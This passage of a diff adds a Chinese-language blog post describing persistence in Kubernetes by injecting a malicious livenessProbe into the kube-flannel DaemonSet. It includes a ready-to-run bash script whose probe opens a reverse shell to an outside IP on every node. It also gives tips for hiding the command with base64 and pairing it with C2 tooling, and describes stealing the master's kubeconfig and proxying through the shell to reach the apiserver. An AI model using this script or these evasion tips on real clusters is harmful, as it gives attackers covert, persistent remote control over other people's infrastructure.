+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>        - --<span style="color:#ae81ff">ip-masq</span>
+</span></span><span style="display:flex;"><span>        - --<span style="color:#ae81ff">kube-subnet-mgr</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">/opt/bin/flanneld</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">env</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">POD_NAME</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">valueFrom</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">fieldRef</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">fieldPath</span>: <span style="color:#ae81ff">metadata.name</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">POD_NAMESPACE</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">valueFrom</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">fieldRef</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">fieldPath</span>: <span style="color:#ae81ff">metadata.namespace</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">EVENT_QUEUE_DEPTH</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">value</span>: <span style="color:#e6db74">&#34;5000&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">docker.io/flannel/flannel:v0.25.1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">imagePullPolicy</span>: <span style="color:#ae81ff">IfNotPresent</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-flannel</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">resources</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">requests</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">cpu</span>: <span style="color:#ae81ff">100m</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">memory</span>: <span style="color:#ae81ff">50Mi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">securityContext</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">capabilities</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">add</span>:
+</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">NET_ADMIN</span>
+</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">NET_RAW</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">privileged</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationMessagePath</span>: <span style="color:#ae81ff">/dev/termination-log</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationMessagePolicy</span>: <span style="color:#ae81ff">File</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/run/flannel</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">run</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/etc/kube-flannel/</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">flannel-cfg</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/run/xtables.lock</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">xtables-lock</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">dnsPolicy</span>: <span style="color:#ae81ff">ClusterFirst</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">hostNetwork</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">initContainers</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>        - -<span style="color:#ae81ff">f</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">/flannel</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">/opt/cni/bin/flannel</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">cp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">docker.io/flannel/flannel-cni-plugin:v1.4.1-flannel1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">imagePullPolicy</span>: <span style="color:#ae81ff">IfNotPresent</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">install-cni-plugin</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">resources</span>: {}
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationMessagePath</span>: <span style="color:#ae81ff">/dev/termination-log</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationMessagePolicy</span>: <span style="color:#ae81ff">File</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/opt/cni/bin</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">cni-plugin</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>        - -<span style="color:#ae81ff">f</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">/etc/kube-flannel/cni-conf.json</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">/etc/cni/net.d/10-flannel.conflist</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#ae81ff">cp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">docker.io/flannel/flannel:v0.25.1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">imagePullPolicy</span>: <span style="color:#ae81ff">IfNotPresent</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">install-cni</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">resources</span>: {}
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationMessagePath</span>: <span style="color:#ae81ff">/dev/termination-log</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">terminationMessagePolicy</span>: <span style="color:#ae81ff">File</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumeMounts</span>:
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/etc/cni/net.d</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">cni</span>
+</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/etc/kube-flannel/</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">flannel-cfg</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">priorityClassName</span>: <span style="color:#ae81ff">system-node-critical</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">schedulerName</span>: <span style="color:#ae81ff">default-scheduler</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">securityContext</span>: {}
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">serviceAccount</span>: <span style="color:#ae81ff">flannel</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">serviceAccountName</span>: <span style="color:#ae81ff">flannel</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">terminationGracePeriodSeconds</span>: <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">tolerations</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">effect</span>: <span style="color:#ae81ff">NoSchedule</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">operator</span>: <span style="color:#ae81ff">Exists</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/run/flannel</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">run</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/opt/cni/bin</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">cni-plugin</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/etc/cni/net.d</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">type</span>: <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">cni</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">configMap</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">defaultMode</span>: <span style="color:#ae81ff">420</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">name</span>: <span style="color:#ae81ff">kube-flannel-cfg</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">flannel-cfg</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">hostPath</span>:
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/run/xtables.lock</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">type</span>: <span style="color:#ae81ff">FileOrCreate</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">name</span>: <span style="color:#ae81ff">xtables-lock</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">updateStrategy</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">rollingUpdate</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">maxSurge</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">maxUnavailable</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">type</span>: <span style="color:#ae81ff">RollingUpdate</span>
+</span></span></code></pre></div><p>经过分析其yaml可以得到注入脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># inject-flannel-probe.sh -- Insert malicious livenessProbe into kube-flannel DaemonSet (no temp files)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage: ./inj_probe.sh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>set -e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># bash built-in TCP socket (zero external commands)</span>
+</span></span><span style="display:flex;"><span>PROBE_CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/bin/bash -i &gt;&amp; /dev/tcp/8.156.69.160/2333 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PROBE_BLOCK<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        livenessProbe:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          exec:\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            command:\n            - /bin/bash\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - -c\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - &#39;</span>$PROBE_CMD<span style="color:#e6db74">&#39;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          initialDelaySeconds: 30\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          periodSeconds: 5\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          failureThreshold: 2147483647&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===== insert before first &#34;volumeMounts:&#34; in the first container =====</span>
+</span></span><span style="display:flex;"><span>kubectl -n kube-flannel get ds kube-flannel-ds -o yaml <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| awk -v pb<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$PROBE_BLOCK<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /^        [a-zA-Z].*:$/ &amp;&amp; !done &amp;&amp; $0 ~ /volumeMounts:/ {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        print pb; done=1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    { print }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| kubectl apply -f -
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl -n kube-flannel rollout status ds/kube-flannel-ds
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Done&#34;</span>
+</span></span></code></pre></div><p>上面是演示脚本，如果想要增加隐蔽性和可用性可以考虑下面的几点：</p>
+<ul>
+<li>
+<p>将命令编码，比如将明文的反弹shell命令改为base64解码后执行的命令，防止查看yaml时被一眼排查</p>
+</li>
+<li>
+<p>修改参数<code>periodSeconds: 5</code>，这里是每 5 秒执行一次，可以适当增加时间间隔</p>
+</li>
+<li>
+<p>由于是所有节点的被注入pod都会反弹shell，所以也可以考虑使用部分c2的一键上线命令增加可用性</p>
+</li>
+</ul>
+<p>在master节点运行脚本实现注入：
+<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760007966340.png" alt="QQ_1760007966340"></p>
+<p>5秒后监听的vps会收到反弹shell：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760008096321.png" alt="QQ_1760008096321"></p>
+<p>并且被注入pod的容器数也不会有任何变化，相比sidecar更加隐蔽：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760065070968.png" alt="QQ_1760065070968"></p>
+<h3 id="思路优化-1">思路优化</h3>
+<p>虽然我们在上面可以得到kube-flannel的pod的shell，但和sidecar不同，由于这个容器不是我们主动创建的，所以我们不能自主的去除容器与宿主机隔离，那这样就显得很鸡肋了，连我们连node都摸不到有啥用</p>
+<p>有没有能够提高可用性的方法呢，笔者在这里抛砖引玉：</p>
+<p>我们在维持的时候既然已经控制了master节点，那么我们可以将其上面的高权限kubeconfig文件保存下来：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760068484348-20251010123942590.png" alt=""></p>
+<p>由于很多时候这种文件中证书允许的apiserver的ip都是内网IP，所以无法直接远程控制apiserver：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760071161676.png" alt="QQ_1760071161676"></p>
+<p>而我们又维持了kube-flannel控制的pod的shell，所以我们可以用这个shell做代理:</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760071247498.png" alt="QQ_1760071247498"></p>
+<p>搭建代理之后即可在本地使用高权限kubeconfig文件来远程调用apiserver：</p>
+<p><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1760072110174.png" alt="QQ_1760072110174"></p>
+<h2 id="总结">总结</h2>
+<p>总的来看，动态容器注入的本质就是通过修改daemonset的yaml实现新增sidecar容器或存活探针，来命令执行实现权限维持</p>
+<p>当然，这里仅记录了笔者能想到的trick，如果有更好的办法欢迎在大家提出讨论</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://blog.wohin.me/posts/k0otkit/">《k0otkit: Hack K8s in a K8s Way》</a></li>
+<li>《ADCONF2025-云原生攻击路径》</li>
+</ul>
+
+  
+
+
+  </main>
+  <footer>
+    <p>Copyright 2025. All rights reserved.</p>
+
+  </footer>
+</body>
+</html>
